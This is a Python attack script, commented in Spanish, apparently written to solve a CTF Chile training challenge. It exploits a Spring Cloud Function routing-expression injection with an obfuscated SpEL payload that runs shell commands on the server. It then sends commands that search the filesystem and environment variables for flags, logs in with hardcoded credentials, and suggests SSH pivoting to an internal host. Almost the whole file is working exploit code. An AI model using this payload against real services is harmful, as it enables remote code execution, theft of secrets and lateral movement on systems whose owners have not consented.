#!/usr/bin/env python3
"""
CTF Chile - EXTRACCIÓN DIRECTA DE FLAGS SIN WEBHOOKS
Buscar flags directamente en las respuestas HTTP
"""
import requests
import re
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("🚀 EXTRACCIÓN DIRECTA DE FLAGS - SIN WEBHOOKS")
print("=" * 60)

def build_payload(cmd):
    payload = (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + cmd.replace('"', '\\"') + '"}'
        ').waitFor()'
    )
    return payload

def execute_and_search_flags(cmd, description):
    """Ejecuta comando y busca flags directamente en la respuesta"""
    print(f"   🔍 {description}")

    payload = build_payload(cmd)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)

        response = r.text.strip()

        # Buscar flags directamente
        flag_patterns = [
            r'CTF\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'flag\{[^}]+\}',
            r'chile\{[^}]+\}'
        ]

        for pattern in flag_patterns:
            matches = re.findall(pattern, response, re.IGNORECASE)
            if matches:
                print(f"   🏆 FLAG ENCONTRADA: {matches[0]}")
                return matches[0]

        # Si la respuesta es larga y no es error estándar, mostrarla
        if len(response) > 50 and "omnivault-core-api" not in response and "Internal Server Error" not in response:
            print(f"   📄 Respuesta: {response[:200]}...")

        return None

    except Exception as e:
        print(f"   ❌ Error: {e}")
        return None

print("[1] Búsqueda directa de archivos flag...")

# Comandos directos para buscar flags
flag_commands = [
    ("find / -name '*flag*' 2>/dev/null | head -10 | xargs cat 2>/dev/null", "Buscar archivos flag"),
    ("grep -r 'CTF{' / 2>/dev/null | head -5", "Buscar CTF{ en todo el sistema"),
    ("grep -r 'FLAG{' / 2>/dev/null | head -5", "Buscar FLAG{ en todo el sistema"),
    ("find /root /home /app -name '*.txt' 2>/dev/null | xargs grep -l 'flag' 2>/dev/null | head -5 | xargs cat", "Buscar flags en archivos txt"),
    ("env | grep -iE '(flag|ctf)'", "Variables de entorno con flag"),
    ("cat /flag.txt /app/flag.txt /root/flag.txt 2>/dev/null", "Archivos flag típicos"),
    ("strings /app/app.jar | grep -E 'CTF\\{|FLAG\\{' | head -5", "Flags en JAR"),
]

found_flags = []

for cmd, desc in flag_commands:
    flag = execute_and_search_flags(cmd, desc)
    if flag:
        found_flags.append(flag)

print(f"\n[2] Usando credenciales vault:admin123 para endpoints específicos...")

# Ya sabemos que vault:admin123 funciona, vamos directo
auth_response = requests.post(f"{TARGET}/api/login",
                             headers={"Content-Type": "application/json"},
                             json={"username": "vault", "password": "admin123"},
                             timeout=10)

print(f"   Login vault: {auth_response.status_code} - {auth_response.text}")

# Probar diferentes formatos de la app web
web_endpoints = [
    f"{TARGET}/inversiones.html",
    f"{TARGET}/admin.html",
    f"{TARGET}/config.html",
    f"{TARGET}/vault.html",
    f"{TARGET}/flag.html",
    f"{TARGET}/secret.html"
]

for endpoint in web_endpoints:
    try:
        r = requests.get(endpoint, timeout=5)
        if r.status_code == 200 and "flag" in r.text.lower():
            print(f"   🎯 Contenido en {endpoint}: {r.text[:300]}...")

            # Buscar flags en HTML
            flag_patterns = [
                r'CTF\{[^}]+\}',
                r'FLAG\{[^}]+\}',
                r'flag\{[^}]+\}',
            ]

            for pattern in flag_patterns:
                matches = re.findall(pattern, r.text, re.IGNORECASE)
                if matches:
                    print(f"   🏆 FLAG EN HTML {endpoint}: {matches[0]}")
                    found_flags.append(matches[0])

    except:
        pass

print(f"\n[3] Búsqueda en la aplicación web...")

# Buscar en comentarios HTML y JavaScript
try:
    main_page = requests.get(TARGET, timeout=10)
    if "<!--" in main_page.text:
        print(f"   📝 Comentarios HTML encontrados")
        # Buscar flags en comentarios
        comment_pattern = r'<!--.*?-->'
        comments = re.findall(comment_pattern, main_page.text, re.DOTALL)
        for comment in comments:
            if "flag" in comment.lower() or "ctf" in comment.lower():
                print(f"   💡 Comentario relevante: {comment}")

                flag_patterns = [r'CTF\{[^}]+\}', r'FLAG\{[^}]+\}', r'flag\{[^}]+\}']
                for pattern in flag_patterns:
                    matches = re.findall(pattern, comment, re.IGNORECASE)
                    if matches:
                        print(f"   🏆 FLAG EN COMENTARIO: {matches[0]}")
                        found_flags.append(matches[0])

except Exception as e:
    print(f"   ❌ Error buscando en página principal: {e}")

print(f"\n" + "="*60)
print("🏆 RESUMEN DE FLAGS ENCONTRADAS:")
print("="*60)

if found_flags:
    unique_flags = list(set(found_flags))
    for i, flag in enumerate(unique_flags, 1):
        print(f"   {i}. {flag}")
else:
    print("❌ No se encontraron flags directamente")
    print("")
    print("💡 SIGUIENTE PASO:")
    print("   La flag podría estar en archivos del servidor SSH interno")
    print("   Necesitamos usar las credenciales vault para SSH:")
    print("   ssh vault@10.160.209.1 (con password admin123)")
    print("   Luego buscar: find / -name '*flag*' | xargs cat")

print("="*60)